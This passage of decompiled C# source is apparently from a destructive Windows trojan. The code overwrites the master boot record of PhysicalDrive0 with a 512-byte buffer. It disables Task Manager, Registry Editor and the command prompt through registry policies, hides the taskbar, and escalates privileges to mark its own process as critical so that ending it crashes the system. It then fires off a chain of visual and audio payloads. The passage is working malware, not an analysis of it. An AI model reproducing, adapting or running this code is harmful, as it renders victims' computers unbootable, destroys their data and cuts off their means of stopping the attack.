				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				85, 170
			};
			IntPtr intPtr = Program.CreateFile("\\\\.\\PhysicalDrive0", 268435456U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero);
			uint num;
			Program.WriteFile(intPtr, array, 512U, out num, IntPtr.Zero);
			Program.Destructiveshit.Noskidbruh();
			Program.seedForPlayer = Program.RAND.Next();
			ThreadStart threadStart;
			if ((threadStart = Program.<>O.<0>__player) == null)
			{
				threadStart = (Program.<>O.<0>__player = new ThreadStart(Program.player));
			}
			new Thread(threadStart)
			{
				IsBackground = true
			}.Start();
			Program.payload2();
			Program.seedForPlayer = Program.RAND.Next();
			ThreadStart threadStart2;
			if ((threadStart2 = Program.<>O.<0>__player) == null)
			{
				threadStart2 = (Program.<>O.<0>__player = new ThreadStart(Program.player));
			}
			new Thread(threadStart2)
			{
				IsBackground = true
			}.Start();
			Program.payload3();
			Program.seedForPlayer = Program.RAND.Next();
			ThreadStart threadStart3;
			if ((threadStart3 = Program.<>O.<0>__player) == null)
			{
				threadStart3 = (Program.<>O.<0>__player = new ThreadStart(Program.player));
			}
			new Thread(threadStart3)
			{
				IsBackground = true
			}.Start();
			Program.payload4();
			Program.seedForPlayer = Program.RAND.Next();
			ThreadStart threadStart4;
			if ((threadStart4 = Program.<>O.<0>__player) == null)
			{
				threadStart4 = (Program.<>O.<0>__player = new ThreadStart(Program.player));
			}
			new Thread(threadStart4)
			{
				IsBackground = true
			}.Start();
			Program.payload5();
			Program.seedForPlayer = Program.RAND.Next();
			ThreadStart threadStart5;
			if ((threadStart5 = Program.<>O.<0>__player) == null)
			{
				threadStart5 = (Program.<>O.<0>__player = new ThreadStart(Program.player));
			}
			new Thread(threadStart5)
			{
				IsBackground = true
			}.Start();
			Program.payload6();
			Program.seedForPlayer = Program.RAND.Next();
			ThreadStart threadStart6;
			if ((threadStart6 = Program.<>O.<0>__player) == null)
			{
				threadStart6 = (Program.<>O.<0>__player = new ThreadStart(Program.player));
			}
			new Thread(threadStart6)
			{
				IsBackground = true
			}.Start();
			Program.payload7();
			Program.seedForPlayer = Program.RAND.Next();
			ThreadStart threadStart7;
			if ((threadStart7 = Program.<>O.<0>__player) == null)
			{
				threadStart7 = (Program.<>O.<0>__player = new ThreadStart(Program.player));
			}
			new Thread(threadStart7)
			{
				IsBackground = true
			}.Start();
			Program.payload8();
		}
	}

	// Token: 0x04000002 RID: 2
	private const int SAMPLE_RATE = 16000;

	// Token: 0x04000003 RID: 3
	private const int SEG_SECONDS = 50;

	// Token: 0x04000004 RID: 4
	private static Random RAND = new Random();

	// Token: 0x04000005 RID: 5
	private const int SM_CXSCREEN = 0;

	// Token: 0x04000006 RID: 6
	private const int SM_CYSCREEN = 1;

	// Token: 0x04000007 RID: 7
	private const uint GenericRead = 2147483648U;

	// Token: 0x04000008 RID: 8
	private const uint GenericWrite = 1073741824U;

	// Token: 0x04000009 RID: 9
	private const uint GenericExecute = 536870912U;

	// Token: 0x0400000A RID: 10
	private const uint GenericAll = 268435456U;

	// Token: 0x0400000B RID: 11
	private const uint FileShareRead = 1U;

	// Token: 0x0400000C RID: 12
	private const uint FileShareWrite = 2U;

	// Token: 0x0400000D RID: 13
	private const uint OpenExisting = 3U;

	// Token: 0x0400000E RID: 14
	private const uint FileFlagDeleteOnClose = 1073741824U;

	// Token: 0x0400000F RID: 15
	private const uint MbrSize = 512U;

	// Token: 0x04000010 RID: 16
	private const int SRCCOPY = 13369376;

	// Token: 0x04000011 RID: 17
	private const int SRCINVERT = 6684742;

	// Token: 0x04000012 RID: 18
	private const int SRCPAINT = 15597702;

	// Token: 0x04000013 RID: 19
	private const int SRCAND = 8913094;

	// Token: 0x04000014 RID: 20
	private const int PATINVERT = 5898313;

	// Token: 0x04000015 RID: 21
	private const int BLACKNESS = 66;

	// Token: 0x04000016 RID: 22
	private const int DIB_RGB_COLORS = 0;

	// Token: 0x04000017 RID: 23
	private static volatile int seedForPlayer = 0;

	// Token: 0x02000006 RID: 6
	private struct BITMAPINFOHEADER
	{
		// Token: 0x04000019 RID: 25
		public uint biSize;

		// Token: 0x0400001A RID: 26
		public int biWidth;

		// Token: 0x0400001B RID: 27
		public int biHeight;

		// Token: 0x0400001C RID: 28
		public ushort biPlanes;

		// Token: 0x0400001D RID: 29
		public ushort biBitCount;

		// Token: 0x0400001E RID: 30
		public uint biCompression;

		// Token: 0x0400001F RID: 31
		public uint biSizeImage;

		// Token: 0x04000020 RID: 32
		public int biXPelsPerMeter;

		// Token: 0x04000021 RID: 33
		public int biYPelsPerMeter;

		// Token: 0x04000022 RID: 34
		public uint biClrUsed;

		// Token: 0x04000023 RID: 35
		public uint biClrImportant;
	}

	// Token: 0x02000007 RID: 7
	private struct BITMAPINFO
	{
		// Token: 0x04000024 RID: 36
		public Program.BITMAPINFOHEADER bmiHeader;

		// Token: 0x04000025 RID: 37
		public uint bmiColors;
	}

	// Token: 0x02000008 RID: 8
	public static class Destructiveshit
	{
		// Token: 0x06000020 RID: 32 RVA: 0x00003E2C File Offset: 0x0000202C
		private static void SetRegValue(RegistryHive root, string subKey, string valueName, int value)
		{
			try
			{
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(root, RegistryView.Default).CreateSubKey(subKey, RegistryKeyPermissionCheck.ReadWriteSubTree))
				{
					bool flag = registryKey != null;
					if (flag)
					{
						registryKey.SetValue(valueName, value, RegistryValueKind.DWord);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00003E98 File Offset: 0x00002098
		private static void DisableSystemTools()
		{
			Program.Destructiveshit.SetRegValue(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", 1);
			Program.Destructiveshit.SetRegValue(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", 1);
			Program.Destructiveshit.SetRegValue(RegistryHive.CurrentUser, "Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", 1);
		}

		// Token: 0x06000022 RID: 34
		[DllImport("user32.dll")]
		private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

		// Token: 0x06000023 RID: 35
		[DllImport("user32.dll")]
		private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		// Token: 0x06000024 RID: 36 RVA: 0x00003EE8 File Offset: 0x000020E8
		private static void HideTaskbar()
		{
			IntPtr intPtr = Program.Destructiveshit.FindWindow("Shell_TrayWnd", null);
			bool flag = intPtr != IntPtr.Zero;
			if (flag)
			{
				Program.Destructiveshit.ShowWindow(intPtr, 0);
			}
		}

		// Token: 0x06000025 RID: 37
		[DllImport("ntdll.dll")]
		private static extern int RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

		// Token: 0x06000026 RID: 38
		[DllImport("ntdll.dll")]
		private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

		// Token: 0x06000027 RID: 39
		[DllImport("advapi32.dll")]
		private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

		// Token: 0x06000028 RID: 40
		[DllImport("advapi32.dll")]
		private static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);

		// Token: 0x06000029 RID: 41
		[DllImport("advapi32.dll")]
		private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref Program.Destructiveshit.TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

		// Token: 0x0600002A RID: 42 RVA: 0x00003F1C File Offset: 0x0000211C
		private static bool EnablePriv(string lpszPriv)
		{
			IntPtr intPtr;
			bool flag = !Program.Destructiveshit.OpenProcessToken((IntPtr)(-1), 40U, out intPtr);
			bool flag2;
			if (flag)
			{
				flag2 = false;
			}
			else
			{
				long num;
				bool flag3 = !Program.Destructiveshit.LookupPrivilegeValue(null, lpszPriv, out num);
				if (flag3)
				{
					Program.Destructiveshit.CloseHandle(intPtr);
					flag2 = false;
				}
				else
				{
					Program.Destructiveshit.TOKEN_PRIVILEGES token_PRIVILEGES = new Program.Destructiveshit.TOKEN_PRIVILEGES
					{
						PrivilegeCount = 1,
						Luid = num,
						Attributes = 2
					};
					bool flag4 = Program.Destructiveshit.AdjustTokenPrivileges(intPtr, false, ref token_PRIVILEGES, Marshal.SizeOf<Program.Destructiveshit.TOKEN_PRIVILEGES>(token_PRIVILEGES), IntPtr.Zero, IntPtr.Zero);
					Program.Destructiveshit.CloseHandle(intPtr);
					flag2 = flag4;
				}
			}
			return flag2;
		}

		// Token: 0x0600002B RID: 43
		[DllImport("kernel32.dll")]
		private static extern bool CloseHandle(IntPtr hObject);

		// Token: 0x0600002C RID: 44
		[DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
		private static extern IntPtr LoadLibrary(string lpFileName);

		// Token: 0x0600002D RID: 45
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
		private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

		// Token: 0x0600002E RID: 46 RVA: 0x00003FB4 File Offset: 0x000021B4
		private static bool ProcessIsCritical()
		{
			bool flag8;
			try
			{
				bool flag;
				int num = Program.Destructiveshit.RtlAdjustPrivilege(20, true, false, out flag);
				bool flag2 = num == 0;
				if (flag2)
				{
					int num2 = 1;
					num = Program.Destructiveshit.NtSetInformationProcess((IntPtr)(-1), 29, ref num2, 4);
					bool flag3 = num == 0;
					if (flag3)
					{
						return true;
					}
				}
				IntPtr intPtr = Program.Destructiveshit.LoadLibrary("ntdll.dll");
				bool flag4 = intPtr != IntPtr.Zero;
				if (flag4)
				{
					bool flag5 = Program.Destructiveshit.EnablePriv("SeDebugPrivilege");
					if (flag5)
					{
						IntPtr procAddress = Program.Destructiveshit.GetProcAddress(intPtr, "RtlSetProcessIsCritical");
						bool flag6 = procAddress != IntPtr.Zero;
						if (flag6)
						{
							Program.Destructiveshit.RtlSetProcessIsCritical rtlSetProcessIsCritical = (Program.Destructiveshit.RtlSetProcessIsCritical)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Program.Destructiveshit.RtlSetProcessIsCritical));
							bool flag7;
							rtlSetProcessIsCritical(true, out flag7, false);
							return true;
						}
					}
				}
				flag8 = false;
			}
			catch
			{
				flag8 = false;
			}
			return flag8;
		}

		// Token: 0x0600002F RID: 47 RVA: 0x00004098 File Offset: 0x00002298
		public static void Noskidbruh()
		{
			try
			{
				Program.Destructiveshit.DisableSystemTools();
				Program.Destructiveshit.HideTaskbar();
				Program.Destructiveshit.ProcessIsCritical();
			}
			catch
			{
			}
		}

		// Token: 0x04000026 RID: 38
		private const int SW_HIDE = 0;

		// Token: 0x04000027 RID: 39
		private const uint TOKEN_QUERY = 8U;

		// Token: 0x04000028 RID: 40
		private const uint TOKEN_ADJUST_PRIVILEGES = 32U;

		// Token: 0x04000029 RID: 41
		private const int SE_PRIVILEGE_ENABLED = 2;

		// Token: 0x0400002A RID: 42
		private const string SE_DEBUG_NAME = "SeDebugPrivilege";

		// Token: 0x0400002B RID: 43
		private const int PROCESS_CRITICAL = 29;

		// Token: 0x0400002C RID: 44
		private const int SE_DEBUG_PRIVILEGE = 20;

		// Token: 0x0200000B RID: 11
		private struct TOKEN_PRIVILEGES
		{
			// Token: 0x0400002E RID: 46
			public int PrivilegeCount;

			// Token: 0x0400002F RID: 47
			public long Luid;

			// Token: 0x04000030 RID: 48
			public int Attributes;
		}

		// Token: 0x0200000C RID: 12
		// (Invoke) Token: 0x06000031 RID: 49
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate void RtlSetProcessIsCritical(bool NewValue, out bool OldValue, bool IsWinlogon);
	}

	// Token: 0x02000009 RID: 9
	[CompilerGenerated]
	private static class <>O
	{
		// Token: 0x0400002D RID: 45
		public static ThreadStart <0>__player;
	}
}
